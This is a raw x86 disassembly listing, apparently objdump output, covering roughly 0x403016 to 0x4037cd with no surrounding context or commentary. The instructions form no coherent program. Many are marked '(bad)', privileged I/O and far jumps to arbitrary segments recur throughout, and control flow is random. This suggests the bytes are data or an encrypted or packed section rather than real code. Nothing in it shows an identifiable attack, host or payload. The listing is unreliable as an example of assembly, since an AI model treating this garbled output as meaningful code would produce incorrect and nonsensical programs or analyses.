  403016:	(bad)  [edx-0x499653e6]
  40301c:	in     al,dx
  40301d:	mov    ah,0x18
  40301f:	fisttp DWORD PTR [ebx-0x6ba5b72]
  403025:	iret   
  403026:	dec    eax
  403027:	ret    0x39e
  40302a:	das    
  40302b:	test   al,0x4a
  40302d:	in     al,dx
  40302e:	xchg   ebp,eax
  40302f:	je     0x403036
  403031:	xor    al,0x4a
  403033:	scas   al,BYTE PTR es:[edi]
  403034:	xchg   ecx,eax
  403035:	imul   edx,DWORD PTR [edx+0x27],0xffffffe5
  403039:	sub    ecx,DWORD PTR [ebp+0x5acec5ad]
  40303f:	pop    ebp
  403040:	jb     0x40300a
  403042:	outs   dx,DWORD PTR ds:[esi]
  403043:	mov    ebx,0xad2d6653
  403048:	loopne 0x403080
  40304a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40304b:	outs   dx,BYTE PTR ds:[esi]
  40304c:	stos   DWORD PTR es:[edi],eax
  40304d:	push   0x4d
  40304f:	jp     0x4030af
  403051:	inc    esi
  403052:	cs (bad) 
  403054:	xlat   BYTE PTR ds:[ebx]
  403055:	jp     0x4030c4
  403057:	stos   DWORD PTR es:[edi],eax
  403058:	add    DWORD PTR [esi+0x4c],0xffffffef
  40305c:	pop    ebp
  40305d:	fist   DWORD PTR [ebp+0x55]
  403060:	mov    ax,WORD PTR [ebp-0x4]
  403064:	jmp    0x403415
  403069:	jl     0x403082
  40306b:	sub    al,0xf7
  40306d:	jge    0x402ffc
  40306f:	jge    0x40306e
  403071:	inc    edx
  403072:	sbb    dh,BYTE PTR [ebx]
  403074:	fistp  DWORD PTR ds:0x9e1d9951
  40307a:	sbb    bh,BYTE PTR [esi+0x7e]
  40307d:	xor    BYTE PTR [ecx+0x7e],0x7e
  403081:	jmp    0x9911:0xadba1d28
  403088:	inc    edi
  403089:	pop    ebp
  40308a:	jae    0x403086
  40308c:	xchg   DWORD PTR [edx+0xb],ecx
  40308f:	ror    BYTE PTR [edi],cl
  403091:	inc    ebp
  403092:	repz push edi
  403094:	cwde   
  403095:	dec    esp
  403096:	retf   0x1c7d
  403099:	hlt    
  40309a:	iret   
  40309b:	les    esi,FWORD PTR [esi-0x3e]
  40309e:	aam    0x8a
  4030a0:	xchg   esp,eax
  4030a1:	sbb    DWORD PTR [edi],eax
  4030a3:	aaa    
  4030a4:	mov    ch,0x17
  4030a6:	movups xmm0,XMMWORD PTR [eax]
  4030a9:	xchg   edi,eax
  4030aa:	cmp    ebx,DWORD PTR [ebp+0x47]
  4030ad:	aam    0xcd
  4030af:	xchg   edi,eax
  4030b0:	jl     0x4030d9
  4030b2:	dec    ecx
  4030b3:	mov    DWORD PTR [ecx],eax
  4030b5:	arpl   WORD PTR [eax],sp
  4030b7:	pop    ebp
  4030b8:	adc    al,0x2c
  4030ba:	and    DWORD PTR [esi-0x2f],esp
  4030bd:	bound  ebx,QWORD PTR [eax]
  4030bf:	std    
  4030c0:	loopne 0x403091
  4030c2:	cmp    al,0x2f
  4030c4:	push   ecx
  4030c5:	pop    es
  4030c6:	ret    0x7939
  4030c9:	xchg   BYTE PTR [esi],dl
  4030cb:	(bad)  
  4030cc:	retf   
  4030cd:	jp     0x40313e
  4030cf:	push   ebx
  4030d0:	mov    al,0xef
  4030d2:	cmp    DWORD PTR [edi-0x4b7807e5],ebp
  4030d8:	jl     0x40307e
  4030da:	mov    ds:0xf67e3e96,eax
  4030df:	xor    eax,0x3a55e231
  4030e4:	scas   al,BYTE PTR es:[edi]
  4030e5:	xor    BYTE PTR [edi-0x7040b14],0x28
  4030ec:	sbb    al,0x1e
  4030ee:	aas    
  4030ef:	je     0x40315d
  4030f1:	shl    DWORD PTR [ecx+0x18fe67f7],0xaa
  4030f8:	jae    0x4030cc
  4030fa:	clc    
  4030fb:	ds stc 
  4030fd:	icebp  
  4030fe:	loopne 0x4030e4
  403100:	retf   0x5546
  403103:	pop    eax
  403104:	sub    DWORD PTR [ebx+0x236fe462],eax
  40310a:	push   esp
  40310b:	retf   
  40310c:	sbb    eax,0xfd3c1c14
  403111:	cmp    ebx,DWORD PTR [edx+edx*8+0x49]
  403115:	(bad)  
  403116:	ror    DWORD PTR [eax+0x69de19f0],0xa3
  40311d:	sti    
  40311e:	ss mov dl,0xda
  403121:	fild   DWORD PTR [eax-0x22f5266e]
  403127:	popa   
  403128:	jle    0x4030f3
  40312a:	sub    DWORD PTR [ecx+0x492f2ca6],0xa87be9cc
  403134:	sbb    ebp,ebp
  403136:	pushf  
  403137:	sbb    ebx,DWORD PTR [ecx+0x13]
  40313a:	sbb    al,0xec
  40313c:	add    eax,0x3f5f52d2
  403141:	xlat   BYTE PTR ds:[ebx]
  403142:	popa   
  403143:	jmp    0x7044:0x7529242b
  40314a:	ret    
  40314b:	imul   eax,DWORD PTR [esi+0x3341bd32],0xffffffbd
  403152:	test   BYTE PTR [ebx-0x5d3c6316],dl
  403158:	pop    eax
  403159:	retf   
  40315a:	and    dh,al
  40315c:	adc    DWORD PTR [esi+eiz*2-0x74],ecx
  403160:	sub    DWORD PTR [eax],0x96fe66ef
  403166:	jge    0x403111
  403168:	jmp    0x4aa:0xb13d2a8b
  40316f:	inc    edi
  403170:	rol    BYTE PTR [eax-0x30],1
  403173:	fimul  DWORD PTR [edx+0x3f]
  403176:	mov    ch,0xb5
  403178:	ins    BYTE PTR es:[edi],dx
  403179:	adc    eax,0x3bcf6720
  40317e:	pushf  
  40317f:	retf   0xc13f
  403182:	scas   al,BYTE PTR es:[edi]
  403183:	imul   ecx,esp,0xffffff82
  403186:	and    DWORD PTR [ebp+0x242e15a8],eax
  40318c:	mov    DWORD PTR [edx+0xfa3640f],esp
  403192:	leave  
  403193:	arpl   ax,ax
  403195:	or     al,0x55
  403198:	fsub   QWORD PTR [edx+0x481a4828]
  40319e:	ja     0x4031f4
  4031a0:	retf   0xe204
  4031a3:	scas   eax,DWORD PTR es:[edi]
  4031a4:	push   cs
  4031a5:	push   esp
  4031a6:	fwait
  4031a7:	ins    DWORD PTR es:[edi],dx
  4031a8:	adc    BYTE PTR [ecx+ebx*8-0x4f952371],ch
  4031af:	daa    
  4031b0:	arpl   WORD PTR [esi+0x6f4c925b],di
  4031b6:	mov    ds:0xee4615a4,al
  4031bb:	js     0x40313f
  4031bd:	ss js  0x40315b
  4031c0:	mov    dh,BYTE PTR [edx]
  4031c2:	sbb    ch,BYTE PTR [edx+0x53]
  4031c5:	outs   dx,DWORD PTR ds:[esi]
  4031c6:	jle    0x403222
  4031c8:	les    esi,FWORD PTR [eax+0x5be841b4]
  4031ce:	jne    0x40318c
  4031d0:	std    
  4031d1:	jmp    0xaac1:0x784eb312
  4031d8:	and    DWORD PTR ds:0x67efcec7,ecx
  4031de:	ins    DWORD PTR es:[edi],dx
  4031df:	(bad)  
  4031e0:	adc    al,0x79
  4031e2:	and    eax,0xc898e0ad
  4031e7:	sub    eax,0x29790abf
  4031ec:	leave  
  4031ed:	enter  0xc4e8,0x5e
  4031f1:	rcr    BYTE PTR [ecx+0x73a03c74],0xb3
  4031f8:	add    DWORD PTR [edx],esi
  4031fa:	mov    esi,0xd655917a
  4031ff:	xor    al,0x4b
  403201:	inc    ebp
  403202:	push   cs
  403203:	mov    esp,DWORD PTR [ecx]
  403205:	mov    ds:0x46712e62,eax
  40320a:	lds    edx,FWORD PTR [esi+0x3d051a46]
  403210:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403211:	push   ss
  403212:	jbe    0x4031ba
  403214:	jno    0x403221
  403216:	push   esi
  403217:	or     BYTE PTR [edi+0x18],ah
  40321a:	repz dec edi
  40321c:	pop    es
  40321d:	idiv   edi
  40321f:	dec    ebx
  403220:	and    eax,0x283cb17e
  403225:	call   FWORD PTR [eax]
  403227:	cld    
  403228:	(bad)  
  403229:	fbstp  TBYTE PTR [esi+0xc712664]
  40322f:	or     eax,0xcdd307e7
  403234:	mov    ?,WORD PTR [edi-0x2d]
  403237:	jb     0x403245
  403239:	ja     0x40327b
  40323b:	pop    es
  40323c:	les    ebp,FWORD PTR [esi-0x75818ab4]
  403242:	stc    
  403243:	test   DWORD PTR [edi+0xc],0xbd8389c3
  40324a:	sub    bl,cl
  40324c:	inc    eax
  40324d:	mov    esp,0xd6add961
  403252:	push   0x1e373a69
  403257:	imul   edi,esi,0x4d
  40325a:	jle    0x40329a
  40325c:	adc    bh,BYTE PTR [ecx]
  40325e:	dec    eax
  40325f:	xchg   ebx,eax
  403260:	lds    ebx,FWORD PTR [ebx+0x4b]
  403263:	jmp    0xd00f:0xdf67f663
  40326a:	(bad)  
  40326b:	ins    DWORD PTR es:[edi],dx
  40326c:	les    esi,FWORD PTR [ebx-0x23]
  40326f:	loop   0x4032ad
  403271:	rcr    DWORD PTR [eax-0xd],cl
  403274:	shl    BYTE PTR [ebx],1
  403276:	sub    DWORD PTR [edi+0x5a51d796],esp
  40327c:	dec    ebp
  40327d:	data16 sub dl,BYTE PTR [edi]
  403280:	mov    eax,ds:0x1b1d3fd4
  403285:	inc    esp
  403286:	mov    cl,0xaa
  403288:	cmp    esi,0xfffffff6
  40328b:	(bad)  
  40328c:	jns    0x40329c
  40328e:	and    al,ah
  403290:	xor    ebp,DWORD PTR ds:[ecx+edi*1+0x6af6bc1b]
  403298:	dec    ebp
  403299:	add    ch,BYTE PTR [esi-0x6ef6ed2f]
  40329f:	pop    ebx
  4032a0:	push   edi
  4032a1:	mov    al,0x4a
  4032a3:	add    eax,0xb3bc0e09
  4032a8:	lds    ebx,FWORD PTR [edx]
  4032aa:	cmp    eax,0x753422cf
  4032af:	sub    bl,BYTE PTR [ebx+0xf]
  4032b2:	push   cs
  4032b3:	pusha  
  4032b4:	leave  
  4032b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032b6:	mov    ds:0x343c43e0,al
  4032bb:	test   al,0xf7
  4032bd:	sub    dl,ch
  4032bf:	repnz xlat BYTE PTR ds:[ebx]
  4032c1:	sti    
  4032c2:	imul   edi,DWORD PTR [eax+0x44],0xaeb52127
  4032c9:	xchg   ecx,eax
  4032ca:	pop    ecx
  4032cb:	sti    
  4032cc:	xchg   edx,eax
  4032cd:	gs (bad) 
  4032cf:	(bad)  
  4032d0:	clc    
  4032d1:	xor    ebx,DWORD PTR [eax*2-0x2b773f71]
  4032d8:	outs   dx,BYTE PTR ds:[esi]
  4032d9:	sbb    al,0x2
  4032db:	retf   
  4032dc:	inc    esp
  4032dd:	shl    cl,0xcc
  4032e0:	enter  0x1ab4,0x69
  4032e4:	jl     0x40327b
  4032e6:	xchg   BYTE PTR [eax-0x6a],cl
  4032e9:	jge    0x40326c
  4032eb:	or     eax,0x262d94da
  4032f0:	nop
  4032f1:	push   cs
  4032f2:	hlt    
  4032f3:	jecxz  0x403278
  4032f5:	shl    BYTE PTR [edx+0x4c],cl
  4032f8:	outs   dx,DWORD PTR ds:[esi]
  4032f9:	jae    0x403327
  4032fb:	int    0xac
  4032fd:	inc    esp
  4032fe:	arpl   WORD PTR [esi],sp
  403300:	push   ebx
  403301:	dec    esi
  403302:	add    eax,0xb303c6e0
  403307:	lds    esi,FWORD PTR [ecx+0xc18c7d6]
  40330d:	push   es
  40330e:	imul   ebp,DWORD PTR [ebx-0x5e],0xffffffc2
  403312:	ss ret 
  403314:	fs call 0xadd8:0xc796fdfc
  40331c:	cdq    
  40331d:	lock jp 0x403331
  403320:	lds    ecx,FWORD PTR [eax]
  403322:	push   ecx
  403323:	std    
  403324:	ror    BYTE PTR [ebp-0x2c49495c],1
  40332a:	cmp    BYTE PTR [esi],cl
  40332c:	push   ebp
  40332d:	ins    DWORD PTR es:[edi],dx
  40332e:	dec    edx
  40332f:	and    eax,DWORD PTR [esp+ecx*1+0x7f05e213]
  403336:	data16 fisubr WORD PTR [edi+ebx*8]
  40333a:	dec    edx
  40333b:	sbb    BYTE PTR [esi-0x1b9c322a],0xea
  403342:	push   esi
  403343:	mov    ebx,ds
  403345:	les    eax,FWORD PTR [esi-0x45]
  403348:	aaa    
  403349:	add    BYTE PTR [edx],bh
  40334b:	shl    BYTE PTR [edi+0x3e6bde03],cl
  403351:	dec    ebx
  403352:	add    bh,bh
  403354:	add    ebp,edi
  403356:	push   ebx
  403357:	inc    eax
  403358:	push   es
  403359:	mov    ds:0x65234378,al
  40335e:	in     eax,0xf4
  403360:	pop    ss
  403361:	dec    BYTE PTR [ebx+0x4b]
  403364:	cmp    BYTE PTR [eax],cl
  403366:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403367:	and    al,BYTE PTR [ecx]
  403369:	and    bl,dl
  40336b:	sbb    al,0x6
  40336d:	pushf  
  40336e:	inc    esp
  40336f:	xor    bl,BYTE PTR [ebp+0x3142a637]
  403375:	jg     0x4033b5
  403377:	in     eax,0x17
  403379:	ins    BYTE PTR es:[edi],dx
  40337a:	imul   ebp,DWORD PTR [edi-0x38],0xffffffdb
  40337e:	fldenv [ecx+0x19]
  403381:	push   edx
  403382:	test   BYTE PTR [ebx-0xa],bl
  403385:	sub    DWORD PTR [eax-0x9],ebx
  403388:	sub    eax,0x2ae62005
  40338d:	add    dl,BYTE PTR [eax-0x22e1fe10]
  403393:	xchg   esp,eax
  403394:	std    
  403395:	fadd   DWORD PTR [edi+0x42]
  403398:	mov    esp,0xe7a9b88e
  40339d:	cwde   
  40339e:	lods   al,BYTE PTR ds:[esi]
  40339f:	shl    DWORD PTR [ecx+0x2e],cl
  4033a2:	mov    dh,0xf5
  4033a4:	xchg   esi,eax
  4033a5:	out    0x5b,eax
  4033a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033a8:	mov    bl,0x23
  4033aa:	sbb    eax,0x11714809
  4033af:	dec    esi
  4033b0:	pop    ebp
  4033b1:	fbstp  TBYTE PTR [edi]
  4033b3:	push   bp
  4033b5:	sbb    al,BYTE PTR [eax+eiz*8]
  4033b8:	inc    ecx
  4033b9:	add    DWORD PTR [edx+0x33],ebx
  4033bc:	lahf   
  4033bd:	loopne 0x4033a2
  4033bf:	pop    esp
  4033c0:	mov    ds:0xf9418457,al
  4033c5:	scas   al,BYTE PTR es:[edi]
  4033c6:	stc    
  4033c7:	repz xchg ebp,eax
  4033c9:	sahf   
  4033ca:	bound  esp,QWORD PTR [ebx]
  4033cc:	cmp    eax,0x51993c56
  4033d1:	xchg   edi,eax
  4033d2:	clc    
  4033d3:	adc    dh,dh
  4033d5:	push   0x22
  4033d7:	cmp    DWORD PTR ds:0xce492ef6,edx
  4033dd:	nop
  4033de:	jo     0x40338f
  4033e0:	in     al,dx
  4033e1:	cmp    DWORD PTR [ebp-0x25],ebp
  4033e4:	sbb    DWORD PTR [esi-0x58e80d71],esi
  4033ea:	lock rol BYTE PTR [edi],0xaf
  4033ee:	mov    ch,0xca
  4033f0:	jl     0x40344b
  4033f2:	adc    al,0xa6
  4033f4:	into   
  4033f5:	aam    0x89
  4033f7:	or     esp,DWORD PTR [ebp+0x7b30cbde]
  4033fd:	bound  ebp,QWORD PTR [edi-0x29]
  403400:	clc    
  403401:	enter  0x6fff,0xc0
  403405:	pop    ecx
  403406:	call   0x679faba0
  40340b:	or     DWORD PTR [edx],eax
  40340d:	mov    ds:0xefcbb774,eax
  403412:	das    
  403413:	ret    0x8b8b
  403416:	jge    0x403420
  403418:	mov    edi,DWORD PTR [edi]
  40341a:	mov    edx,0x8a40
  40341f:	xor    ax,dx
  403422:	jmp    0x4037d3
  403427:	nop
  403428:	cdq    
  403429:	fst    QWORD PTR [ecx-0x6683aa03]
  40342f:	xlat   BYTE PTR ds:[ebx]
  403430:	push   cs
  403431:	mov    cl,0xfe
  403433:	repz dec ebx
  403435:	inc    esp
  403436:	mov    dh,0x22
  403438:	push   ds
  403439:	jle    0x4034b9
  40343b:	xor    BYTE PTR [ecx+0x7e],0x7e
  40343f:	sbb    al,0xe
  403441:	call   0xf996:0xfc2662f7
  403448:	dec    edi
  403449:	je     0x403434
  40344b:	or     DWORD PTR [eax-0x5592403e],ebp
  403451:	out    dx,eax
  403452:	push   esp
  403453:	mov    dl,bh
  403455:	xchg   ebx,eax
  403456:	mov    dh,0x85
  403458:	(bad)  
  403459:	sub    eax,0xb0061992
  40345e:	sbb    esi,DWORD PTR [ebp-0x2a5e5915]
  403464:	dec    ebp
  403465:	pop    esi
  403466:	stos   BYTE PTR es:[edi],al
  403467:	stos   DWORD PTR es:[edi],eax
  403468:	mov    ebp,0x53cd34d3
  40346d:	frstor [eax]
  40346f:	test   DWORD PTR [esi+0x7a],ebx
  403472:	jbe    0x40343a
  403474:	fimul  WORD PTR [ecx]
  403476:	pop    esp
  403477:	shl    edx,0xb2
  40347a:	(bad)  
  40347b:	xchg   edi,eax
  40347c:	leave  
  40347d:	jecxz  0x4034c3
  40347f:	arpl   WORD PTR [edx-0x371d453f],sp
  403485:	mov    bh,0x16
  403487:	rol    DWORD PTR [edx],cl
  403489:	iret   
  40348a:	or     ecx,DWORD PTR [ebp+0x41de3337]
  403490:	jle    0x4034cf
  403492:	pop    eax
  403493:	aaa    
  403494:	fild   WORD PTR [edi+0x1a]
  403497:	adc    dh,BYTE PTR [edx+edx*1-0x40fb66b0]
  40349e:	cmp    ebx,DWORD PTR fs:[ecx-0x23b830c5]
  4034a5:	in     eax,dx
  4034a6:	aas    
  4034a7:	mov    eax,0x934c5ef7
  4034ac:	aam    0x1
  4034ae:	jae    0x40345c
  4034b0:	lods   eax,DWORD PTR fs:[esi]
  4034b2:	fcom   QWORD PTR [ebx]
  4034b4:	jnp    0x4034c0
  4034b6:	dec    esi
  4034b7:	xchg   ebp,eax
  4034b8:	sahf   
  4034b9:	jb     0x403440
  4034bb:	xchg   esp,eax
  4034bc:	mov    esp,DWORD PTR [eax-0x1b]
  4034bf:	mov    ebp,0x1889903e
  4034c4:	sbb    eax,0x246c1851
  4034c9:	push   eax
  4034ca:	sub    ecx,DWORD PTR [eax-0x3a]
  4034cd:	inc    ebp
  4034ce:	inc    eax
  4034cf:	or     ah,BYTE PTR [edi+0x3]
  4034d2:	sbb    cl,BYTE PTR [esi+edx*8-0x1]
  4034d6:	add    eax,0x342e1a1d
  4034db:	icebp  
  4034dc:	push   cs
  4034dd:	fmulp  st(5),st
  4034df:	into   
  4034e0:	sub    eax,0x9a493b9b
  4034e5:	popa   
  4034e6:	or     eax,0x69a7846a
  4034eb:	jnp    0x403533
  4034ed:	xchg   esp,eax
  4034ee:	sub    ecx,edi
  4034f0:	cmp    ah,BYTE PTR [edi+0x67]
  4034f3:	push   esi
  4034f4:	adc    ebx,esi
  4034f6:	sub    DWORD PTR [esi+edx*4+0x38],esp
  4034fa:	xchg   esp,eax
  4034fb:	or     eax,0x6265ac91
  403500:	push   edx
  403501:	jne    0x40353d
  403503:	leave  
  403504:	out    dx,eax
  403505:	das    
  403506:	repz xor al,0x7e
  403509:	les    ebp,FWORD PTR [edx+0x7]
  40350c:	es cmc 
  40350e:	or     al,cl
  403510:	push   ecx
  403511:	push   edi
  403512:	mov    edi,0x8e0c4483
  403517:	stos   BYTE PTR es:[edi],al
  403518:	retf   0x220d
  40351b:	inc    edi
  40351c:	fcmovu st,st(2)
  40351e:	push   edx
  40351f:	mov    WORD PTR [eax],?
  403521:	xor    eax,0xb20604a8
  403526:	pusha  
  403527:	xchg   ecx,eax
  403528:	in     al,dx
  403529:	dec    edx
  40352a:	or     BYTE PTR [esi+0x49],0x4d
  40352e:	ins    DWORD PTR es:[edi],dx
  40352f:	mov    ch,0xa8
  403531:	add    esi,ecx
  403533:	mov    cl,0x61
  403535:	adc    eax,0x98390307
  40353a:	push   esi
  40353b:	inc    esi
  40353c:	push   edx
  40353d:	jb     0x403563
  40353f:	shl    DWORD PTR [ebx],cl
  403541:	pop    ebx
  403542:	pop    esi
  403543:	sub    BYTE PTR [ecx],ah
  403545:	cld    
  403546:	mov    ds:0xff86e8e8,al
  40354b:	stc    
  40354c:	or     DWORD PTR [edi+0x20],edi
  40354f:	add    BYTE PTR [edi+edi*1-0x10],ah
  403553:	into   
  403554:	mov    DWORD PTR [ecx],edx
  403556:	shl    edi,0x6f
  403559:	push   eax
  40355a:	ja     0x4035d8
  40355c:	aas    
  40355d:	hlt    
  40355e:	add    dl,BYTE PTR [ecx+0x4392c328]
  403564:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403566:	push   ds
  403567:	loop   0x403545
  403569:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40356a:	xchg   ebx,eax
  40356b:	adc    ah,BYTE PTR [ecx+0x59]
  40356e:	sti    
  40356f:	push   es
  403570:	or     DWORD PTR [eax+eax*8-0x3600ff02],esi
  403577:	dec    ebx
  403578:	inc    BYTE PTR [edx]
  40357a:	push   edx
  40357b:	mov    ebp,0x93d2d7fb
  403580:	adc    BYTE PTR [edx-0x35],dl
  403583:	inc    esi
  403584:	addr16 jb 0x4035c5
  403587:	xchg   ecx,eax
  403588:	sub    DWORD PTR [esi-0x1cccac57],edi
  40358e:	arpl   WORD PTR [ebx+0x65],ax
  403591:	dec    BYTE PTR [ebx+0xd97ce5b]
  403597:	shl    ecx,1
  403599:	and    al,0xaa
  40359b:	cmp    dh,dh
  40359d:	nop
  40359e:	test   al,0x7
  4035a0:	jb     0x403621
  4035a2:	imul   ecx,DWORD PTR [esi],0x12
  4035a5:	jb     0x403624
  4035a7:	mov    esi,0x77d2c5f0
  4035ac:	ss repz xchg esp,eax
  4035af:	dec    edi
  4035b0:	test   eax,0x160fd5e2
  4035b5:	retf   
  4035b6:	sbb    DWORD PTR [edi+0x77],edi
  4035b9:	cmp    bh,BYTE PTR [edx-0x2b0f546b]
  4035bf:	pop    es
  4035c0:	mov    esi,DWORD PTR [ecx+0x601fab97]
  4035c6:	add    al,0x34
  4035c8:	xchg   DWORD PTR [esi-0x6df56075],edi
  4035ce:	mov    edi,0xd5cb28b9
  4035d3:	push   esi
  4035d4:	jl     0x40355b
  4035d6:	jecxz  0x4035ea
  4035d8:	xor    BYTE PTR [edx],ah
  4035da:	mov    al,ds:0xa2b5094c
  4035df:	dec    esi
  4035e0:	jle    0x4035e5
  4035e2:	jnp    0x4035c7
  4035e4:	lock fs out dx,eax
  4035e7:	aas    
  4035e8:	fiadd  WORD PTR [ecx-0x4e0b1bd9]
  4035ee:	fldcw  WORD PTR [esi]
  4035f0:	adc    edx,DWORD PTR ds:0xcf43cff5
  4035f6:	pop    ecx
  4035f7:	cmp    eax,0x8d06e886
  4035fc:	jle    0x403643
  4035fe:	in     eax,0xfe
  403600:	mov    edx,0xb71a3bc7
  403605:	jl     0x40361a
  403607:	or     dl,BYTE PTR [edx-0x59f4b0cd]
  40360d:	add    eax,0x95531821
  403612:	pop    ds
  403613:	xlat   BYTE PTR ds:[ebx]
  403614:	cmp    edi,DWORD PTR [ecx+0xa]
  403617:	fild   DWORD PTR [edx+ebp*1+0x322bd897]
  40361e:	pop    esp
  40361f:	ss pop es
  403621:	test   BYTE PTR [eax+0x3b],ch
  403624:	outs   dx,DWORD PTR ds:[esi]
  403625:	sub    esi,edx
  403627:	aam    0xe8
  403629:	in     eax,dx
  40362a:	or     al,0xd9
  40362c:	jl     0x40368f
  40362e:	stos   DWORD PTR es:[edi],eax
  40362f:	sar    BYTE PTR [esi],cl
  403631:	sbb    DWORD PTR [ebx+0x1a],edx
  403634:	inc    eax
  403635:	test   BYTE PTR [edx+0x27],bh
  403638:	scas   eax,DWORD PTR es:[edi]
  403639:	neg    BYTE PTR [ecx-0x39]
  40363c:	cwde   
  40363d:	sbb    BYTE PTR ds:[eax-0x3e],0xc8
  403642:	mov    edi,0x87c8f953
  403647:	pop    edx
  403648:	mov    ds:0x8c84f23b,al
  40364d:	jns    0x4036a9
  40364f:	push   eax
  403650:	imul   ebp,DWORD PTR [ebx],0x2d
  403653:	popa   
  403654:	xchg   ecx,eax
  403655:	les    esp,FWORD PTR [ecx]
  403657:	inc    eax
  403658:	cld    
  403659:	add    al,0xa4
  40365b:	std    
  40365c:	shl    BYTE PTR [esi],0x6b
  40365f:	sbb    esi,DWORD PTR [eax+0x6e47f59b]
  403665:	inc    ebx
  403666:	push   esp
  403667:	stc    
  403668:	xchg   BYTE PTR [ecx-0x4a158cc1],ah
  40366e:	popf   
  40366f:	sub    ebx,DWORD PTR [ebp-0x44043d9d]
  403675:	ds aaa 
  403677:	sub    esp,eax
  403679:	push   esp
  40367a:	xor    ebx,ebp
  40367c:	inc    ebp
  40367d:	cmp    DWORD PTR ds:0x1b1673b6,esi
  403683:	iret   
  403684:	inc    ebx
  403685:	ror    BYTE PTR es:[esi+0x1e],0xfc
  40368a:	fnsave [ebx]
  40368c:	(bad)  
  40368d:	pop    eax
  40368e:	and    ch,BYTE PTR [edx+ecx*1+0x6d05eef3]
  403695:	mov    dh,0xb6
  403697:	mov    ?,edi
  403699:	push   esi
  40369a:	cmp    edx,edi
  40369c:	clc    
  40369d:	das    
  40369e:	ficom  WORD PTR [esi+0x5f97ebe]
  4036a4:	add    al,0xf8
  4036a6:	mov    ebp,0x66dcccf0
  4036ab:	outs   dx,BYTE PTR ds:[esi]
  4036ac:	push   esi
  4036ad:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4036af:	xchg   ecx,eax
  4036b0:	pop    es
  4036b1:	or     BYTE PTR [edi-0xc],ah
  4036b4:	add    eax,ebp
  4036b6:	push   ebp
  4036b7:	pop    ss
  4036b8:	out    0x89,eax
  4036ba:	lahf   
  4036bb:	ins    BYTE PTR es:[edi],dx
  4036bc:	push   edx
  4036bd:	jmp    0x5b9d:0x74398e4b
  4036c4:	retf   
  4036c5:	push   esp
  4036c6:	(bad)  
  4036c7:	es dec esi
  4036c9:	xchg   ecx,eax
  4036ca:	cmp    ecx,ebp
  4036cc:	sbb    edi,DWORD PTR [edi]
  4036ce:	xor    ch,BYTE PTR [ecx+0x20]
  4036d1:	pop    ebp
  4036d2:	data16 mov al,ds:0x19df773f
  4036d8:	add    eax,0x46cb29da
  4036dd:	pushf  
  4036de:	xchg   ebx,eax
  4036df:	paddb  mm4,mm4
  4036e2:	xchg   edx,eax
  4036e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036e4:	jp     0x40367b
  4036e6:	xchg   DWORD PTR [edi+0x802bb4d],edx
  4036ec:	inc    esi
  4036ed:	pop    esp
  4036ee:	mov    ebx,0x68adfae8
  4036f3:	ret    0xd8f5
  4036f6:	lods   eax,DWORD PTR ds:[esi]
  4036f7:	fnsave [edx-0x18b03d11]
  4036fd:	inc    esp
  4036fe:	mov    al,0x9e
  403700:	out    dx,al
  403701:	adc    DWORD PTR [edi],edi
  403703:	jae    0x4036b2
  403705:	data16 int3 
  403707:	aam    0x56
  403709:	inc    esp
  40370a:	iret   
  40370b:	(bad)  
  40370c:	scas   al,BYTE PTR es:[edi]
  40370d:	add    ebx,DWORD PTR [ecx+0x5062cff4]
  403713:	scas   eax,DWORD PTR es:[edi]
  403714:	pop    edi
  403715:	sbb    al,0x89
  403717:	adc    al,0x57
  403719:	les    esi,FWORD PTR [edi]
  40371b:	xchg   DWORD PTR [edx],esi
  40371d:	sbb    edx,eax
  40371f:	ja     0x40379e
  403721:	ficomp DWORD PTR [ebx-0x558a8da9]
  403727:	dec    ebp
  403728:	(bad)  
  403729:	mov    DWORD PTR [edi],esp
  40372b:	mov    eax,ds:0x3414a4e2
  403730:	jae    0x4036ef
  403732:	jmp    DWORD PTR [esi+eiz*4]
  403735:	or     eax,0xd887367c
  40373a:	adc    al,0x78
  40373c:	test   BYTE PTR [edi-0x6d],bh
  40373f:	push   eax
  403740:	or     dh,al
  403742:	shl    bh,0x83
  403745:	or     BYTE PTR cs:[edx-0x170a0bce],0x36
  40374d:	push   cs
  40374e:	adc    al,0x86
  403750:	sbb    edi,ecx
  403752:	popa   
  403753:	xor    DWORD PTR [ebx-0x47],ebp
  403756:	shl    ch,cl
  403758:	jo     0x40376b
  40375a:	and    al,0xe2
  40375c:	sbb    edi,edx
  40375e:	and    DWORD PTR [edx-0x1502fa4],0x4f304978
  403768:	jg     0x403734
  40376a:	(bad)  
  40376b:	call   0xe87b1ca3
  403770:	sbb    eax,0x14313ed2
  403775:	xchg   esi,eax
  403776:	or     ecx,DWORD PTR [eax]
  403778:	repnz outs dx,BYTE PTR ds:[esi]
  40377a:	repnz or DWORD PTR [eax+0x75bde063],eax
  403781:	sub    dh,BYTE PTR [edi+0x642340fb]
  403787:	push   ss
  403788:	enter  0x514e,0xb4
  40378c:	jo     0x4037cf
  40378e:	jmp    0x4037dc
  403790:	sub    eax,0x9cab6b63
  403795:	push   ebx
  403796:	out    dx,eax
  403797:	mov    ecx,0xd77941ee
  40379c:	aaa    
  40379d:	inc    ebp
  40379e:	ss (bad) 
  4037a0:	sahf   
  4037a1:	xchg   DWORD PTR [edi],ebx
  4037a3:	lods   eax,DWORD PTR ds:[esi]
  4037a4:	push   cs
  4037a5:	pushf  
  4037a6:	sbb    BYTE PTR [ecx+ebp*2],ah
  4037a9:	add    bl,BYTE PTR [edi-0x2b]
  4037ac:	jp     0x4037d2
  4037ae:	push   ebp
  4037af:	push   edx
  4037b0:	and    dl,BYTE PTR [ebx]
  4037b2:	leave  
  4037b3:	jmp    0x403742
  4037b5:	and    ch,dl
  4037b7:	cmp    ecx,DWORD PTR [esi]
  4037b9:	dec    edx
  4037ba:	pop    eax
  4037bb:	je     0x4037b3
  4037bd:	js     0x403779
  4037bf:	or     al,0xe
  4037c1:	xchg   bx,ax
  4037c3:	mov    al,0x4a
  4037c5:	mov    ds:0x7faf678,eax
  4037ca:	fwait
  4037cb:	mov    ah,0x69
  4037cd:	pusha  
